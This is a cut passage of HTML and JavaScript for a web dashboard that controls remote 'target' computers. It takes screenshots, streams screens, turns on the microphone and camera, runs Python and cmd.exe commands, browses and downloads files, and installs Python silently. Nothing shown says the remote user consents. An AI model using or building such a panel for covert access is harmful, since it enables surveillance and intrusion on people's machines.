            <option value="">Loading computers...</option>
        </select>

        <button onclick="connectComputer()">Connect</button>
        <button onclick="refreshComputers()">Refresh</button>
    </div>

    <p id="connectionStatus" class="status">
        Waiting for a computer...
    </p>
</div>


<div class="panel">
    <h2>Remote Screenshot</h2>

    <button onclick="requestScreenshot()">
        Capture Screenshot
    </button>

    <p id="screenshotStatus" class="muted">
        No screenshot requested.
    </p>

    <img id="screenshot" style="display:none;">
</div>


<div class="panel">

    <div class="panel-header">
        <h2>Remote Screen Share</h2>

        <button id="streamButton" onclick="toggleStream()">
            Start Screen Share
        </button>
    </div>

    <p id="streamStatus" class="muted">
        Screen share is off.
    </p>

    <img id="streamImage" style="display:none;">

</div>


<div class="panel">

    <div class="panel-header">
        <h2>Remote Microphone</h2>

        <button id="micButton" onclick="toggleMicrophone()">
            Start Listening
        </button>
    </div>

    <p id="micStatus" class="muted">
        Microphone is off.
    </p>

    <div class="level-track">
        <div id="micLevel" class="level-fill"></div>
    </div>

</div>


<div class="panel">

    <div class="panel-header">
        <h2>Remote Camera</h2>

        <button id="cameraButton" onclick="toggleCamera()">
            Start Camera
        </button>
    </div>

    <p id="cameraStatus" class="muted">
        Camera is off.
    </p>

    <img id="cameraImage" style="display:none;">

</div>


<div class="panel">

    <div class="panel-header">

        <h2>Run Python Code</h2>

        <button id="pythonRunButton" onclick="runPython()">
            Run Python
        </button>

    </div>

    <p class="muted">
        Paste Python code below. It is saved to a temporary file
        and executed by the Python interpreter on the connected computer.
    </p>

    <textarea
        id="pythonCode"
        spellcheck="false"
        placeholder="print('hello from the target computer')"
    ></textarea>

    <p id="pythonStatus" class="muted">
        No code has been run.
    </p>

    <pre class="output" id="pythonOutput" style="display:none;"></pre>

</div>


<div class="panel">

    <h2>Folder Browser</h2>

    <p class="muted" id="rootLocation">
        Connect to a computer to browse its shared folder.
    </p>

    <div class="row">

        <input
            id="location"
            type="text"
            placeholder="C:/SharedFolder"
            onkeydown="if(event.key === 'Enter') navigateToFolder()"
        >

        <button onclick="navigateToFolder()">
            Open Directory
        </button>

        <button onclick="goToRoot()">
            Root Folder
        </button>

    </div>

    <h3>Output 1: Folders</h3>

    <div class="output" id="directoryTree">
        Connect to a computer to view folders.
    </div>

    <h3>Output 2: Files</h3>

    <div class="output" id="fileOutput">
        Connect to a computer to view files.
    </div>

    <p class="file-status" id="fileStatus"></p>

</div>


<div class="panel">

    <div class="panel-header">

        <h2>Remote Console</h2>

        <button onclick="clearConsole()">
            Clear
        </button>

    </div>

    <p id="consoleTarget" class="muted">
        Connect to a computer to use the console.
    </p>

    <div id="consoleOutput" class="console-screen" aria-live="polite">
        <div class="console-line console-muted">Remote shell ready. Type a command and press Enter.</div>
    </div>

    <div class="console-input-row">

        <span class="console-prompt">remote&gt;</span>

        <input
            id="consoleInput"
            type="text"
            placeholder="No computer connected"
            autocomplete="off"
            spellcheck="false"
            disabled
        >

        <button
            id="consoleRunButton"
            onclick="runConsoleCommand()"
            disabled
        >
            Run
        </button>

    </div>

</div>


<div id="toastStack" class="toast-stack" aria-live="polite"></div>


<button
    id="logToggle"
    class="log-toggle"
    onclick="toggleLogDrawer()"
    title="Show the activity log"
>
    <span class="log-dot"></span>
    Activity Log
    <span id="logCount" class="log-count" hidden>0</span>
</button>


<div id="logDrawer" class="log-drawer" aria-hidden="true">

    <div class="log-header">

        <div class="log-title">
            <span class="log-dot"></span>
            Activity Log
        </div>

        <div class="log-actions">
            <button class="log-action" onclick="clearLogs()">
                Clear
            </button>

            <button
                class="log-action log-close"
                onclick="toggleLogDrawer(false)"
                aria-label="Close activity log"
            >
                &times;
            </button>
        </div>

    </div>

    <div id="logList" class="log-list">
        <div class="log-empty">No activity yet.</div>
    </div>

</div>


<script>

let currentComputer = "";
let currentTree = null;
let currentFolder = "";
let currentRoot = "";

const RENDER_CHUNK = 300;


// ==================================================
// API HELPER
// ==================================================

async function api(url, options = {}) {

    const response = await fetch(url, options);

    if (response.status === 401) {

        window.location.href =
            "/login?next=" +
            encodeURIComponent(
                window.location.pathname + window.location.search
            );

        throw new Error("Sign in required.");
    }

    if (!response.ok) {
        let message = await response.text();

        try {
            const data = JSON.parse(message);
            message = data.error || message;
        } catch {}

        throw new Error(message);
    }

    return response;
}


// ==================================================
// ACTIVITY LOG
// ==================================================

const LOG_LIMIT = 300;

let serverLogId = 0;
let logOpen = false;
let unreadLogs = 0;
let unreadErrors = 0;

const toastTimers = new WeakMap();


function formatLogTime(seconds) {

    const date = new Date(
        (seconds || Date.now() / 1000) * 1000
    );

    return date.toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false
    });
}


function updateLogBadge() {

    const badge = document.getElementById("logCount");

    if (!unreadLogs) {
        badge.hidden = true;
        return;
    }

    badge.hidden = false;

    badge.textContent =
        unreadLogs > 99 ? "99+" : String(unreadLogs);

    badge.classList.toggle(
        "error",
        unreadErrors > 0
    );
}


function appendLogEntry(entry) {

    const list = document.getElementById("logList");

    const empty = list.querySelector(".log-empty");

    if (empty) {
        empty.remove();
    }

    const row = document.createElement("div");

    row.className =
        "log-entry " + (entry.level || "info");

    const time = document.createElement("span");

    time.className = "log-time";
    time.textContent = formatLogTime(entry.time);

    const level = document.createElement("span");

    level.className = "log-level";
    level.textContent = entry.level || "info";

    const message = document.createElement("span");

    message.className = "log-message";
    message.textContent = entry.message || "";

    row.appendChild(time);
    row.appendChild(level);
    row.appendChild(message);

    list.appendChild(row);

    while (list.childElementCount > LOG_LIMIT) {
        list.firstElementChild.remove();
    }

    if (logOpen) {

        list.scrollTop = list.scrollHeight;

    } else {

        unreadLogs++;

        if (entry.level === "error" || entry.level === "warn") {
            unreadErrors++;
        }

        updateLogBadge();
    }
}


function logEvent(level, message) {

    appendLogEntry({
        time: Date.now() / 1000,
        level: level,
        message: message
    });
}


function toggleLogDrawer(force) {

    const drawer = document.getElementById("logDrawer");

    logOpen =
        typeof force === "boolean" ? force : !logOpen;

    drawer.classList.toggle("open", logOpen);

    drawer.setAttribute(
        "aria-hidden",
        logOpen ? "false" : "true"
    );

    document.getElementById("logToggle").title =
        logOpen
            ? "Hide the activity log"
            : "Show the activity log";

    if (logOpen) {

        unreadLogs = 0;
        unreadErrors = 0;

        updateLogBadge();

        const list = document.getElementById("logList");

        list.scrollTop = list.scrollHeight;
    }
}


function clearLogs() {

    document.getElementById("logList").innerHTML =
        '<div class="log-empty">No activity yet.</div>';

    unreadLogs = 0;
    unreadErrors = 0;

    updateLogBadge();

    logEvent("info", "Activity log cleared.");
}


async function pollLogs() {

    try {

        const response = await fetch(
            "/api/logs?after=" + serverLogId
        );

        if (!response.ok) {
            return;
        }

        const data = await response.json();

        for (const entry of data.logs || []) {

            serverLogId = Math.max(serverLogId, entry.id);

            appendLogEntry(entry);
        }

    } catch (error) {}
}


// ==================================================
// TOASTS
// ==================================================

const TOAST_TITLES = {
    info: "Info",
    success: "Done",
    warn: "Warning",
    error: "Error"
};


function dismissToast(toast) {

    const state = toastTimers.get(toast);

    if (state) {
        clearTimeout(state.timer);
        toastTimers.delete(toast);
    }

    if (toast.classList.contains("leaving")) {
        return;
    }

    toast.classList.add("leaving");

    setTimeout(() => toast.remove(), 280);
}


function showToast(message, type = "info", title = "") {

    const stack = document.getElementById("toastStack");

    while (stack.childElementCount >= 4) {
        stack.firstElementChild.remove();
    }

    const toast = document.createElement("div");

    toast.className = "toast " + type;

    const heading = document.createElement("div");

    heading.className = "toast-title";
    heading.textContent = title || TOAST_TITLES[type] || "Info";

    const body = document.createElement("div");

    body.className = "toast-message";
    body.textContent = message;

    const close = document.createElement("button");

    close.className = "toast-close";
    close.textContent = "\u00d7";
    close.setAttribute("aria-label", "Dismiss notification");
    close.onclick = () => dismissToast(toast);

    const progress = document.createElement("div");

    progress.className = "toast-progress";

    const life =
        type === "error" ? 7000 :
        type === "warn" ? 5500 : 4200;

    progress.style.animation =
        "toast-progress " + life + "ms linear forwards";

    toast.appendChild(heading);
    toast.appendChild(body);
    toast.appendChild(close);
    toast.appendChild(progress);

    stack.appendChild(toast);

    const state = {
        startedAt: Date.now(),
        remaining: life,
        timer: null
    };

    state.timer = setTimeout(
        () => dismissToast(toast),
        life
    );

    toastTimers.set(toast, state);

    toast.addEventListener("mouseenter", () => {

        const active = toastTimers.get(toast);

        if (!active) {
            return;
        }

        clearTimeout(active.timer);

        active.remaining -=
            Date.now() - active.startedAt;

        progress.style.animationPlayState = "paused";
    });

    toast.addEventListener("mouseleave", () => {

        const active = toastTimers.get(toast);

        if (!active) {
            return;
        }

        active.startedAt = Date.now();

        progress.style.animationPlayState = "running";

        active.timer = setTimeout(
            () => dismissToast(toast),
            Math.max(900, active.remaining)
        );
    });

    logEvent(
        type === "error" ? "error" :
        type === "warn" ? "warn" :
        type === "success" ? "success" : "info",
        message
    );
}


// ==================================================
// PATH HELPERS
// ==================================================

function normalizePath(path) {

    return path
        .replaceAll("\\", "/")
        .replace(/\/+/g, "/");
}


function getRootPath() {

    let root = normalizePath(currentRoot);

    if (/^[A-Za-z]:$/.test(root)) {
        root += "/";
    }

    return root;
}


function updatePath() {

    const root = getRootPath();

    const relative = normalizePath(currentFolder)
        .replace(/^\/+|\/+$/g, "");

    let fullPath;

    if (!relative) {
        fullPath = root;
    } else if (root.endsWith("/")) {
        fullPath = root + relative;
    } else {
        fullPath = root + "/" + relative;
    }

    document.getElementById("location").value = fullPath;
}


// ==================================================
// COMPUTER LIST
// ==================================================

async function refreshComputers() {

    try {

        const response = await api("/api/clients");
        const data = await response.json();

        const select = document.getElementById("computerSelect");
        const previous = select.value;

        select.innerHTML = "";

        if (data.clients.length === 0) {

            const placeholder =
                document.createElement("option");

            placeholder.value = "";
            placeholder.textContent = "No computers connected";
            placeholder.disabled = true;

            select.appendChild(placeholder);
        }

        for (const computer of data.clients) {

            const option = document.createElement("option");

            option.value = computer.name;

            option.textContent = computer.name;

            select.appendChild(option);
        }

        if (previous && data.clients.some(c => c.name === previous)) {
            select.value = previous;
        }

        const names = data.clients.map(c => c.name);

        if (currentComputer && !names.includes(currentComputer)) {

            const gone = currentComputer;

            currentComputer = "";
            currentTree = null;
            currentFolder = "";
            currentRoot = "";

            streamRunning = false;
            clearTimeout(streamTimer);

            micRunning = false;
            clearTimeout(micTimer);

            cameraRunning = false;
            clearTimeout(cameraTimer);

            liveScreenReset();

            consoleSetTarget();
            consolePrint(gone + " disconnected.", "console-err");

            document.getElementById("connectionStatus").textContent =
                "Waiting for a computer...";

            document.getElementById("rootLocation").textContent =
                "Connect to a computer to browse its shared folder.";

            document.getElementById("directoryTree").textContent =
                "Connect to a computer to view folders.";

            document.getElementById("fileOutput").textContent =
                "Connect to a computer to view files.";

            document.getElementById("fileStatus").textContent = "";

            document.getElementById("screenshot").style.display = "none";
            document.getElementById("streamImage").style.display = "none";
            document.getElementById("cameraImage").style.display = "none";

            document.getElementById("streamButton").textContent =
                "Start Screen Share";

            document.getElementById("streamStatus").textContent =
                "Screen share is off.";

            document.getElementById("micButton").textContent =
                "Start Listening";

            document.getElementById("micStatus").textContent =
                "Microphone is off.";

            document.getElementById("micLevel").style.width = "0";

            document.getElementById("cameraButton").textContent =
                "Start Camera";

            document.getElementById("cameraStatus").textContent =
                "Camera is off.";

            showToast(
                gone + " is no longer connected.",
                "warn",
                "Computer offline"
            );
        }

    } catch (error) {
        console.error(error);
    }
}


// ==================================================
// CONNECT
// ==================================================

async function connectComputer() {

    if (streamRunning) {
        await stopStream();
    }

    if (micRunning) {
        await stopMicrophone();
    }

    if (cameraRunning) {
        await stopCamera();
    }

    liveScreenReset();

    currentComputer =
        document.getElementById("computerSelect").value;

    if (!currentComputer) {
        consoleSetTarget();
        showToast("No computer selected.", "error", "Nothing to connect");
        return;
    }

    consoleSetTarget();

    try {

        const response = await api(
            "/api/tree?name=" +
            encodeURIComponent(currentComputer)
        );

        const data = await response.json();

        currentTree = data.tree;
        currentRoot = data.root;
        currentFolder = "";

        updatePath();

        document.getElementById("rootLocation").textContent =
            "Root folder: " + data.root;

        document.getElementById("connectionStatus").textContent =
            "Connected to " + data.name;

        renderTree();
        renderFiles();

        consoleSetTarget();
        consolePrint(
            "Connected to " + data.name + ".",
            "console-muted"
        );

        showToast(
            "Connected to " + data.name + ".",
            "success",
            "Connected"
        );

    } catch (error) {

        document.getElementById("connectionStatus").textContent =
            "Connection failed: " + error.message;

        showToast(
            "Could not connect: " + error.message,
            "error",
            "Connection failed"
        );

    }
}


// ==================================================
// FIND FOLDER
// ==================================================

function findFolder(node, path) {

    if (!node) {
        return null;
    }

    if (!path || path === ".") {
        return node;
    }

    const parts = normalizePath(path)
        .split("/")
        .filter(Boolean);

    let current = node;

    for (const part of parts) {

        if (part === "." || part === "..") {
            return null;
        }

        const directories = current.dirs || [];

        current = directories.find(
            folder =>
                folder.name.toLowerCase() === part.toLowerCase()
        );

        if (!current) {
            return null;
        }
    }

    return current;
}


// ==================================================
// LAZY FOLDER LOADING
// ==================================================

async function ensureFolderLoaded(path) {

    const folder = findFolder(currentTree, path);

    if (!folder) {
        return false;
    }

    if (folder.loaded) {
        return true;
    }

    const status = document.getElementById("fileStatus");

    status.textContent =
        "Loading " + (path || "root") + "...";

    try {

        const response = await api("/api/request-listing", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer,
                path: path
            })
        });

        const request = await response.json();

        let data = null;

        for (let attempt = 0; attempt < 60; attempt++) {

            await new Promise(resolve =>
                setTimeout(resolve, 500)
            );

            const check = await api(
                "/api/listing-status/" +
                encodeURIComponent(request.request_id)
            );

            data = await check.json();

            if (data.status === "ready") {
                break;
            }

            if (data.status === "error") {
                throw new Error(
                    data.error || "Folder listing failed."
                );
            }
        }

        if (!data || data.status !== "ready" || !data.listing) {
            throw new Error("Folder listing timed out.");
        }

        const target = findFolder(currentTree, path);

        if (!target) {
            throw new Error("Folder is no longer in the tree.");
        }

        target.dirs = data.listing.dirs || [];
        target.files = data.listing.files || [];
        target.loaded = true;

        status.textContent = "";

        return true;

    } catch (error) {

        status.textContent =
            "Folder listing failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Folder listing failed"
        );

        return false;
    }
}


async function ensurePathLoaded(path) {

    const parts = normalizePath(path)
        .split("/")
        .filter(Boolean);

    let prefix = "";

    for (const part of parts) {

        prefix = prefix ? prefix + "/" + part : part;

        const folder = findFolder(currentTree, prefix);

        if (!folder) {
            return false;
        }

        if (!folder.loaded) {

            const loaded = await ensureFolderLoaded(prefix);

            if (!loaded) {
                return false;
            }
        }
    }

    return true;
}


async function openFolder(folder) {

    currentFolder = folder.path || (
        currentFolder
            ? currentFolder + "/" + folder.name
            : folder.name
    );

    updatePath();

    await ensureFolderLoaded(currentFolder);

    renderTree();
    renderFiles();
}


// ==================================================
// FOLDER TREE
// OUTPUT 1
// ==================================================

function renderTree() {

    const container =
        document.getElementById("directoryTree");

    container.innerHTML = "";

    if (!currentTree) {
        container.textContent = "No directory information.";
        return;
    }

    const folder = findFolder(currentTree, currentFolder);

    if (!folder) {
        container.textContent = "Folder not found.";
        return;
    }

    const folders = folder.dirs || [];

    if (folders.length === 0) {
        container.textContent = "No folders in this directory.";
        return;
    }

    folders.forEach(subfolder => {

        const button = document.createElement("button");

        button.className = "folder-button";
        button.textContent = "📁 " + subfolder.name;

        button.onclick = () => openFolder(subfolder);

        const element = document.createElement("div");

        element.className = "directory";
        element.appendChild(button);

        container.appendChild(element);

    });
}


// ==================================================
// FILE LIST
// OUTPUT 2
// ==================================================

function renderFiles() {

    const container =
        document.getElementById("fileOutput");

    container.innerHTML = "";

    const folder = findFolder(currentTree, currentFolder);

    if (!folder) {
        container.textContent = "Folder not found.";
        return;
    }

    const files = folder.files || [];

    if (files.length === 0) {
        container.textContent = "No files in this directory.";
        return;
    }

    renderFileChunk(container, files, 0);
}


function renderFileChunk(container, files, start) {

    const end = Math.min(start + RENDER_CHUNK, files.length);

    for (let index = start; index < end; index++) {

        const file = files[index];

        const item = document.createElement("div");
        item.className = "file-item";

        const name = document.createElement("span");
        name.className = "file-name";

        name.textContent =
            "📄 " + file.name + " (" + formatSize(file.size) + ")";

        const button = document.createElement("button");

        button.textContent = "Download";

        button.onclick = () => downloadFile(file);

        item.appendChild(name);
        item.appendChild(button);

        container.appendChild(item);
    }

    if (end < files.length) {

        const more = document.createElement("button");

        more.textContent =
            "Show more (" + (files.length - end) + " remaining)";

        more.onclick = () => {

            more.remove();

            renderFileChunk(container, files, end);
        };

        container.appendChild(more);
    }
}


// ==================================================
// FILE SIZE
// ==================================================

function formatSize(bytes) {

    if (bytes < 1024) {
        return bytes + " B";
    }

    if (bytes < 1024 * 1024) {
        return (bytes / 1024).toFixed(2) + " KB";
    }

    return (bytes / (1024 * 1024)).toFixed(2) + " MB";
}


// ==================================================
// OPEN DIRECTORY
// ==================================================

async function navigateToFolder() {

    if (!currentTree) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    let entered =
        normalizePath(
            document.getElementById("location").value.trim()
        );

    const root = getRootPath();
    const rootWithoutSlash = root.replace(/\/+$/, "");

    // Handle the root itself.

    if (
        entered.toLowerCase() === root.toLowerCase() ||
        entered.toLowerCase() === rootWithoutSlash.toLowerCase()
    ) {
        goToRoot();
        return;
    }

    // Convert full paths into paths relative to the shared root.

    if (entered.toLowerCase().startsWith(root.toLowerCase())) {

        entered = entered.substring(root.length);

    } else if (
        entered.toLowerCase().startsWith(
            rootWithoutSlash.toLowerCase() + "/"
        )
    ) {

        entered = entered.substring(rootWithoutSlash.length + 1);

    }

    entered = entered.replace(/^\/+|\/+$/g, "");

    // Reject parent-directory traversal.

    if (
        entered.split("/").includes("..") ||
        entered.startsWith("/")
    ) {
        showToast("Invalid directory path.", "error", "Invalid path");
        return;
    }

    const loaded = await ensurePathLoaded(entered);
    const folder = findFolder(currentTree, entered);

    if (!loaded || !folder) {
        showToast(
            "Directory not found inside the shared folder.",
            "error",
            "Folder not found"
        );
        return;
    }

    currentFolder = entered;

    updatePath();
    renderTree();
    renderFiles();
}


// ==================================================
// ROOT FOLDER
// ==================================================

function goToRoot() {

    if (!currentTree) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    currentFolder = "";

    updatePath();
    renderTree();
    renderFiles();
}


// ==================================================
// REMOTE CONSOLE
// ==================================================

const CONSOLE_RESULT_POLL_MS = 500;
const CONSOLE_LINE_LIMIT = 500;

let consoleBusy = false;
let consoleHistory = [];
let consoleHistoryIndex = 0;


function consoleOutput() {

    return document.getElementById("consoleOutput");
}


function consolePrint(text, style) {

    const output = consoleOutput();

    const line = document.createElement("div");

    line.className =
        "console-line" + (style ? " " + style : "");

    line.textContent = text;

    output.appendChild(line);

    while (output.childElementCount > CONSOLE_LINE_LIMIT) {
        output.firstElementChild.remove();
    }

    output.scrollTop = output.scrollHeight;
}


function clearConsole() {

    consoleOutput().innerHTML = "";
}


function consoleSetBusy(value) {

    consoleBusy = value;

    const input = document.getElementById("consoleInput");
    const button = document.getElementById("consoleRunButton");

    input.disabled = value || !currentComputer;
    button.disabled = value || !currentComputer;
}


function consoleSetTarget() {

    const target = document.getElementById("consoleTarget");
    const input = document.getElementById("consoleInput");

    if (currentComputer) {

        target.textContent =
            "Target: " + currentComputer +
            " \u2014 commands run through cmd.exe on that computer.";

        input.placeholder = "Enter command...";

    } else {

        target.textContent =
            "Connect to a computer to use the console.";

        input.placeholder = "No computer connected";
    }

    consoleSetBusy(consoleBusy);
}


async function waitConsoleResult(commandId) {

    const deadline = Date.now() + 900000;

    while (Date.now() < deadline) {

        await new Promise(
            resolve => setTimeout(resolve, CONSOLE_RESULT_POLL_MS)
        );

        const response = await api(
            "/api/console/result/" +
            encodeURIComponent(commandId)
        );

        const data = await response.json();

        if (data.status === "ready") {
            return data;
        }

        if (data.status === "error") {
            throw new Error(
                data.message || "Command failed."
            );
        }
    }

    throw new Error("Timed out waiting for the remote computer.");
}


async function runConsoleCommand() {

    if (consoleBusy) {
        return;
    }

    const input = document.getElementById("consoleInput");
    const command = input.value;

    if (!command.trim() || !currentComputer) {
        return;
    }

    if (["clear", "cls"].includes(command.trim().toLowerCase())) {

        input.value = "";
        clearConsole();
        return;
    }

    consolePrint("remote> " + command, "console-echo");

    consoleHistory.push(command);
    consoleHistoryIndex = consoleHistory.length;

    input.value = "";
    consoleSetBusy(true);

    const computer = currentComputer;

    try {

        const response = await api("/api/console/command", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: computer,
                command: command
            })
        });

        const data = await response.json();

        if (
            /^(python-setup|setup-python|install-python)$/i.test(
                command.trim()
            )
        ) {
            consolePrint(
                "Checking the target computer. A download and silent " +
                "install can take a few minutes...",
                "console-muted"
            );
        }

        const result = await waitConsoleResult(data.command_id);

        if (result.output) {

            consolePrint(
                result.output.replace(/\s+$/, ""),
                "console-out"
            );
        }

        if (result.exit_code) {

            consolePrint(
                "[exit code " + result.exit_code + "]",
                "console-muted"
            );
        }

    } catch (error) {

        consolePrint("ERROR: " + error.message, "console-err");

        showToast(
            error.message,
            "error",
            "Console command failed"
        );

    } finally {

        consoleSetBusy(false);
        consolePrint("", "console-muted");

        if (!input.disabled) {
            input.focus();
        }
    }
}


document.getElementById("consoleInput")
    .addEventListener("keydown", function(event) {

        if (event.key === "Enter") {

            event.preventDefault();
            runConsoleCommand();
            return;
        }

        if (event.key === "ArrowUp") {

            if (!consoleHistory.length) {
                return;
            }

            event.preventDefault();

            consoleHistoryIndex = Math.max(
                0,
                consoleHistoryIndex - 1
            );

            this.value =
                consoleHistory[consoleHistoryIndex] || "";

            return;
        }

        if (event.key === "ArrowDown") {

            if (!consoleHistory.length) {
                return;
            }

            event.preventDefault();

            consoleHistoryIndex = Math.min(
                consoleHistory.length,
                consoleHistoryIndex + 1
            );

            this.value =
                consoleHistory[consoleHistoryIndex] || "";
        }
    });


document.getElementById("consoleOutput")
    .addEventListener("click", function() {

        const input = document.getElementById("consoleInput");

        if (!input.disabled) {
            input.focus();
        }
    });


// ==================================================
// DOWNLOAD FILE
// ==================================================

async function downloadFile(file) {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const status =
        document.getElementById("fileStatus");

    try {

        status.textContent =
            "Requesting: " + file.name;

        const response = await api(
            "/api/request-download",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    name: currentComputer,
                    path: file.path
                })
            }
        );

        const result = await response.json();

        if (!result.download_id) {
            throw new Error("No download ID received.");
        }

        const downloadId = result.download_id;

        status.textContent =
            "Waiting for " + file.name + "...";

        let attempts = 0;

        const checkStatus = async () => {

            attempts++;

            try {

                const check = await api(
                    "/api/download-status/" +
                    encodeURIComponent(downloadId)
                );

                const data = await check.json();

                if (data.status === "ready") {

                    status.textContent =
                        "Download ready: " + file.name;

                    showToast(
                        "Download ready: " + file.name,
                        "success",
                        "Download"
                    );

                    window.location.href =
                        "/api/download/" +
                        encodeURIComponent(downloadId);

                    return;
                }

                if (data.status === "error") {
                    throw new Error(
                        data.message || "Download failed."
                    );
                }

                if (attempts >= 120) {
                    throw new Error("Download timed out.");
                }

                setTimeout(checkStatus, 1500);

            } catch (error) {

                status.textContent =
                    "Download failed: " + error.message;

                showToast(
                    error.message,
                    "error",
                    "Download failed"
                );

            }
        };

        setTimeout(checkStatus, 1500);

    } catch (error) {

        status.textContent =
            "Download failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Download failed"
        );

    }
}


// ==================================================
// SCREENSHOT
// ==================================================

async function requestScreenshot() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const status =
        document.getElementById("screenshotStatus");

    try {

        status.textContent = "Requesting screenshot...";

        const response = await api(
            "/api/request-screenshot",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    name: currentComputer
                })
            }
        );

        const result = await response.json();
        const requestId = result.request_id;

        status.textContent = "Waiting for screenshot...";

        for (let i = 0; i < 30; i++) {

            await new Promise(resolve =>
                setTimeout(resolve, 1000)
            );

            const check = await api(
                "/api/screenshot-status/" +
                encodeURIComponent(requestId)
            );

            const data = await check.json();

            if (data.status === "ready") {

                const image =
                    document.getElementById("screenshot");

                image.src =
                    "/api/latest/" +
                    encodeURIComponent(currentComputer) +
                    ".png?t=" + Date.now();

                image.style.display = "block";

                status.textContent = "Screenshot received.";

                showToast(
                    "Screenshot received from " + currentComputer + ".",
                    "success",
                    "Screenshot"
                );

                return;
            }

            if (data.status === "error") {
                throw new Error(data.message);
            }
        }

        throw new Error("Screenshot timed out.");

    } catch (error) {

        status.textContent =
            "Screenshot failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Screenshot failed"
        );

    }
}


// ==================================================
// LIVE SCREEN SHARE
// ==================================================

const STREAM_REFRESH_MS = 16;

let streamRunning = false;
let streamTimer = null;
let streamObjectUrl = null;


async function toggleStream() {

    if (streamRunning) {
        await stopStream();
    } else {
        await startStream();
    }
}


async function startStream() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const button = document.getElementById("streamButton");
    const status = document.getElementById("streamStatus");
    const image = document.getElementById("streamImage");

    try {

        status.textContent = "Starting screen share...";

        await api("/api/stream/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        streamRunning = true;

        button.textContent = "Stop Screen Share";
        image.style.display = "block";
        status.textContent = "Waiting for the first frame...";

        logEvent(
            "success",
            "Screen share started for " + currentComputer + "."
        );

        pollStream();

    } catch (error) {

        status.textContent =
            "Screen share failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Screen share failed"
        );

    }
}


async function stopStream() {

    const button = document.getElementById("streamButton");
    const status = document.getElementById("streamStatus");

    streamRunning = false;

    clearTimeout(streamTimer);

    button.textContent = "Start Screen Share";
    status.textContent = "Screen share is off.";

    if (!currentComputer) {
        return;
    }

    try {

        await api("/api/stream/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

    } catch (error) {

        console.error(error);

        logEvent(
            "warn",
            "Could not stop screen share: " + error.message
        );
    }
}


async function pollStream() {

    if (!streamRunning) {
        return;
    }

    const status = document.getElementById("streamStatus");
    const image = document.getElementById("streamImage");

    try {

        const response = await fetch(
            "/api/stream/frame/" +
            encodeURIComponent(currentComputer) +
            "?t=" + Date.now(),
            { cache: "no-store" }
        );

        if (response.ok) {

            const blob = await response.blob();

            if (streamObjectUrl) {
                URL.revokeObjectURL(streamObjectUrl);
            }

            streamObjectUrl = URL.createObjectURL(blob);
            image.src = streamObjectUrl;

            status.textContent =
                "Live screen share - " +
                new Date().toLocaleTimeString();
        }

    } catch (error) {
        console.error(error);
    }

    if (streamRunning) {
        streamTimer = setTimeout(
            pollStream,
            STREAM_REFRESH_MS
        );
    }
}


// ==================================================
// LIVE SCREEN PREVIEW
// ==================================================

const LIVE_VIEWER =
    "preview-" + Math.random().toString(36).slice(2, 10);

let liveMaximized = false;
let liveRunning = false;
let liveRafId = null;
let liveObjectUrl = null;
let liveFrameReady = false;
let liveFrameComputer = "";
let liveComputer = "";
let liveFailures = 0;
let liveSession = 0;
let liveMouseDown = false;
let liveModifiers = { Control: false, Alt: false, Shift: false, Meta: false };


function liveStage() {
    return document.getElementById("liveStage");
}


function setLiveBadge(mode, text) {
    const badge = document.getElementById("liveScreenStatus");
    const label = document.getElementById("liveScreenStatusText");
    if (!badge) return;
    badge.classList.toggle("live", mode === "live");
    badge.classList.toggle("busy", mode === "busy");
    if (label) label.textContent = text;
}


function liveToggleMaximize() {
    if (liveMaximized) {
        liveMinimize();
    } else {
        liveMaximize();
    }
}


function liveMaximize() {
    liveMaximized = true;
    liveStage().classList.remove("minimized");
    document.getElementById("liveKeyboard").classList.add("visible");
    document.getElementById("liveToggleBtn").textContent = "Minimize";
    if (!currentComputer) {
        setLiveBadge("idle", "Connect to a computer");
        return;
    }
    liveScreenStart();
}


function liveMinimize() {
    liveMaximized = false;
    liveStage().classList.add("minimized");
    liveStage().classList.remove("visible", "has-frame");
    document.getElementById("liveKeyboard").classList.remove("visible");
    document.getElementById("liveToggleBtn").textContent = "Maximize";
    liveScreenStop("minimize");
    setLiveBadge("idle", "Minimized");
}


async function liveScreenStart() {
    const name = currentComputer;
    if (!name) return;
    if (liveRunning && liveComputer === name) return;
    if (liveRunning || liveComputer) liveScreenStop("switch");

    const session = ++liveSession;
    liveComputer = name;
    liveFrameReady = false;
    liveFailures = 0;

    if (liveFrameComputer !== name) liveStage().classList.remove("has-frame");

    setLiveBadge("busy", "Connecting...");

    try {
        await api("/api/stream/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: name, viewer: LIVE_VIEWER })
        });
    } catch (error) {
        if (session !== liveSession) return;
        liveComputer = "";
        setLiveBadge("idle", "Unavailable");
        showToast(error.message, "error", "Live screen");
        return;
    }

    if (session !== liveSession) return;
    if (!liveMaximized) { liveScreenStop("left"); return; }

    liveRunning = true;
    liveStage().classList.add("visible");
    livePollPreview(session);
}


function liveScreenStop(reason) {
    const name = liveComputer;
    const wasRunning = liveRunning;

    liveSession += 1;
    if (liveRafId) { cancelAnimationFrame(liveRafId); liveRafId = null; }
    liveRunning = false;
    liveComputer = "";
    liveFrameReady = false;

    if (reason !== "reset" && reason !== "minimize") setLiveBadge("idle", "Paused");

    if (!wasRunning || !name) return;

    fetch("/api/stream/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        keepalive: true,
